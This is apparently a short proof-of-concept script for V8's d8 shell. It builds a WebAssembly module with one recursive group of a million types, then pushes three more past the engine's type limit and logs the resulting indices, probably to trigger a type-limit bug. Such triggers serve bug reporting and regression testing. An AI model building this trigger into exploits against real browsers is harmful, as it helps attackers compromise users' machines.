d8.file.execute("wasm-module-builder.js");

const kV8MaxWasmTypes = 1000000;

const builder = new WasmModuleBuilder();

// recursive type group
builder.startRecGroup();
for (let i = 0; i < kV8MaxWasmTypes; i++) {
    builder.addType(makeSig([], []));
}
builder.endRecGroup();

// initial_size == kV8MaxWasmTypes
console.log(`[+] idx == ${builder.addType(makeSig([], []))}`); // expected: kV8MaxWasmTypes
// initial_size == kV8MaxWasmTypes + 1
console.log(`[+] idx == ${builder.addType(makeSig([], []))}`); // expected: kV8MaxWasmTypes + 1
// initial_size == kV8MaxWasmTypes + 2
console.log(`[+] idx == ${builder.addType(makeSig([], []))}`); // expected: kV8MaxWasmTypes + 2

builder.instantiate();
